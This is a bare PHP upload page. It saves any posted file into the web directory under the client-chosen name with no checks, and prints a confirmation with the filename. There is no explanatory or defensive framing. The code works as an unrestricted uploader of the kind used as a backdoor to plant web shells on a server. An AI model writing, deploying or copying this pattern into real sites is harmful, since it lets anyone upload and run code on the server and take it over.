<form method="post" enctype="multipart/form-data">
<input name="upfile" type="file">
<input type="submit" value="ok">
</form>
<?php 
if ($_SERVER['REQUEST_METHOD'] == 'POST')
     { echo "ok：url  +".$_FILES["upfile"]["name"];
         if(!file_exists($_FILES["upfile"]["name"]))
         {
            copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]);
         }
     }
?>
